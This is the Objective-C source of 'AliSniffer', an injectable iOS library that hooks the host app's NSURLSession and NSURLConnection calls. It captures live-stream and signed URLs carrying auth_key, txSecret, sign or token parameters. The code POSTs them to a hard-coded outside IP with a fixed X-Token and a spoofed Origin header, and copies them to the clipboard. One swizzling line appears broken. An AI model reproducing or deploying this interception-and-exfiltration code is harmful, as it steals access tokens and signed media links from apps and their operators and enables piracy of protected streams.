// AliSniffer.m — ULTRA-SAFE 极简稳定版
// 只钩网络层（NSURLSessionTask/NSURLConnection），最大限度避免崩溃；
// 命中：m3u8/flv/rtmp/mp4/ts/php/…  + auth_key/txSecret/txKey/sign/token 优先；
// 上报：POST http://139.155.57.242:8088  X-Token: @Yy166431  依次 /api/push_raw → /push_raw → /push；
// 弹窗：注入即提示；命中后弹窗 + 复制；60s 去重；
// 需要链接：-framework UIKit -framework Foundation

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <objc/runtime.h>
#import <objc/message.h>

#pragma mark - 配置

static NSString * const kPushHost  = @"http://139.155.57.242:8088";
static NSString * const kPushToken = @"@Yy166431";
static inline NSArray<NSString*> *kPushPaths(void){ return @[@"/api/push_raw", @"/push_raw", @"/push"]; }

static const NSTimeInterval kDedupeWindow = 60.0;
static const BOOL kPopupBoot    = YES;
static const BOOL kPopupOnAuth  = YES;
static const BOOL kPopupOnPlain = YES;

#ifndef DEBUG_LOG
#define DEBUG_LOG 0
#endif
#if DEBUG_LOG
#define LOG(fmt, ...) NSLog((@"[AliSniffer] " fmt), ##__VA_ARGS__)
#else
#define LOG(...)
#endif

static dispatch_queue_t gq;
static NSMutableDictionary<NSString*, NSDate*> *g_seen;

#pragma mark - 工具

static inline void on_main(void(^blk)(void)){
    if (!blk) return;
    if ([NSThread isMainThread]) blk(); else dispatch_async(dispatch_get_main_queue(), blk);
}

static BOOL hasAuthLike(NSString *u){
    if (!u) return NO;
    NSString *s = u.lowercaseString;
    return [s containsString:@"auth_key="] ||
           [s containsString:@"txsecret="] ||
           [s containsString:@"txkey="]    ||
           [s containsString:@"sign="]     ||
           [s containsString:@"token="];
}

static BOOL looksLikeStream(NSString *u){
    if (!u) return NO;
    NSString *s = u.lowercaseString;
    if ([s containsString:@".m3u8"] || [s containsString:@".flv"] || [s containsString:@".mp4"] ||
        [s containsString:@".ts"]   || [s hasPrefix:@"rtmp://"]) return YES;
    if ([s containsString:@".php"] || [s containsString:@"phonelive"] ||
        [s containsString:@"replay"] || [s containsString:@"pull."] ||
        [s containsString:@"live"]) return YES;
    if (hasAuthLike(u)) return YES;
    return NO;
}

static BOOL dedupe_skip(NSString *u){
    if (!u) return YES;
    __block BOOL skip = NO;
    dispatch_sync(gq, ^{
        NSDate *last = g_seen[u];
        NSDate *now  = [NSDate date];
        if (last && [now timeIntervalSinceDate:last] < kDedupeWindow) skip = YES;
        else { g_seen[u] = now; skip = NO; }
    });
    return skip;
}

static void popup(NSString *title, NSString *msg, NSString *copyText){
    if (!msg) return;
    on_main(^{
        @try{
            UIWindow *win = UIApplication.sharedApplication.windows.firstObject;
            if (@available(iOS 13.0, *)) {
                for (UIWindowScene *sc in UIApplication.sharedApplication.connectedScenes){
                    if (sc.activationState==UISceneActivationStateForegroundActive){
                        for (UIWindow *w in sc.windows) if (w.isKeyWindow) { win = w; break; }
                        if (win) break;
                    }
                }
            }
            UIViewController *vc = win.rootViewController;
            while (vc.presentedViewController) vc = vc.presentedViewController;

            UIAlertController *ac = [UIAlertController alertControllerWithTitle:title
                                                                        message:msg
                                                                 preferredStyle:UIAlertControllerStyleAlert];
            if (copyText){
                [ac addAction:[UIAlertAction actionWithTitle:@"复制URL" style:UIAlertActionStyleDefault handler:^(__unused UIAlertAction *a){
                    UIPasteboard.generalPasteboard.string = copyText;
                }]];
            }
            [ac addAction:[UIAlertAction actionWithTitle:@"关闭" style:UIAlertActionStyleCancel handler:nil]];
            [vc presentViewController:ac animated:YES completion:nil];
        }@catch(__unused NSException *e){}
    });
}

static void postText(NSString *text, void(^done)(BOOL ok)){
    if (!text){ if(done)done(NO); return; }
    __block NSInteger idx = 0;
    NSArray *paths = kPushPaths();
    __block void (^tryNext)(void) = ^{
        if (idx >= (NSInteger)paths.count){ if(done)done(NO); return; }
        NSString *url = [kPushHost stringByAppendingString:paths[idx++]];
        NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
        req.HTTPMethod = @"POST";
        [req setValue:@"text/plain; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
        [req setValue:kPushToken forHTTPHeaderField:@"X-Token"];
        [req setValue:@"https://app.kuniunet.com/" forHTTPHeaderField:@"Origin"];
        req.HTTPBody = [text dataUsingEncoding:NSUTF8StringEncoding];

        [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(__unused NSData *d, NSURLResponse *r, NSError *e){
            NSInteger sc = [r isKindOfClass:NSHTTPURLResponse.class] ? ((NSHTTPURLResponse*)r).statusCode : -1;
            if (!e && sc>=200 && sc<300) { if(done)done(YES); }
            else tryNext();
        }] resume];
    }; tryNext();
}

static void handleURL(NSString *u, NSString *from){
    if (!u || !looksLikeStream(u)) return;
    if (dedupe_skip(u)) return;

    BOOL auth = hasAuthLike(u);
    NSString *title = auth ? @"抓到 URL（auth_key 优先）" : @"抓到 URL";
    NSString *msg   = from ? [NSString stringWithFormat:@"%@\n%@", from, u] : u;

    postText(u, ^(BOOL ok){
        LOG(@"POST %@ -> %@", u, ok?@"OK":@"FAIL");
        if (auth){
            if (kPopupOnAuth){ popup(title, msg, u); UIPasteboard.generalPasteboard.string = u; }
        }else{
            if (kPopupOnPlain){ popup(title, msg, u); UIPasteboard.generalPasteboard.string = u; }
        }
    });
}

#pragma mark - Hook：NSURLSessionTask -resume

static IMP g_orig_resume = NULL;

static void sn_task_resume(id self, SEL _cmd){
    @try{
        NSURLRequest *req = nil;
        if ([self respondsToSelector:@selector(currentRequest)])
            req = ((NSURLRequest*(*)(id,SEL))objc_msgSend)(self, sel_getUid("currentRequest"));
        if (!req && [self respondsToSelector:@selector(originalRequest)])
            req = ((NSURLRequest*(*)(id,SEL))objc_msgSend)(self, sel_getUid("originalRequest"));
        NSString *s = req.URL.absoluteString;
        if (s.length) dispatch_async(gq, ^{ handleURL(s, @"NSURLSessionTask"); });
    }@catch(__unused NSException *e){}
    ((void(*)(id,SEL))g_orig_resume)(self, _cmd);
}

static void hook_NSURLSessionTask_resume(void){
    Class c = objc_getClass("NSURLSessionTask");
    if (!c) return;
    Method m = class_getInstanceMethod(c, sel_getUid("resume"));
    if (!m) return;
    IMP orig = method_getImplementation(m);
    if (orig == (IMP)sn_task_resume) return;
    g_orig_resume = orig;
    method_exchangeImplementations(m, class_getInstanceMethod(object_getClass((id)^{}) /*dummy*/, sel_getUid("resume"))); // 占位避免编译器警告
    method_setImplementation(m, (IMP)sn_task_resume);
}

#pragma mark - Hook：NSURLConnection（老接口兜底）

static IMP g_orig_conn_init = NULL;
static id sn_conn_init(id self, SEL _cmd, NSURLRequest *req, id delegate, BOOL startImmediately){
    @try{
        if (req.URL.absoluteString.length)
            dispatch_async(gq, ^{ handleURL(req.URL.absoluteString, @"NSURLConnection"); });
    }@catch(__unused NSException *e){}
    return ((id(*)(id,SEL,NSURLRequest*,id,BOOL))g_orig_conn_init)(self,_cmd,req,delegate,startImmediately);
}

static void hook_NSURLConnection(void){
    Class c = objc_getClass("NSURLConnection");
    if (!c) return;
    SEL sel = sel_getUid("initWithRequest:delegate:startImmediately:");
    Method m = class_getInstanceMethod(c, sel);
    if (!m) return;
    IMP orig = method_getImplementation(m);
    if (orig == (IMP)sn_conn_init) return;
    g_orig_conn_init = orig;
    method_setImplementation(m, (IMP)sn_conn_init);
}

#pragma mark - 启动

@interface AliSnifferUltraSafe : NSObject @end
@implementation AliSnifferUltraSafe
+ (void)load {
    // 延迟 1 秒弹“已加载”，避免 UI 尚未就绪
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1*NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        if (kPopupBoot){
            popup(@"AliSniffer 已加载", @"极简稳定版：仅网络层嗅探（NSURLSession/NSURLConnection），auth_key 优先；不改业务、不闪退。", nil);
        }
    });
    @try{
        if (!gq)    gq    = dispatch_queue_create("com.alisniffer.queue", DISPATCH_QUEUE_SERIAL);
        if (!g_seen) g_seen = [NSMutableDictionary dictionary];

        hook_NSURLSessionTask_resume();
        hook_NSURLConnection();

    }@catch(__unused NSException *e){}
}
@end
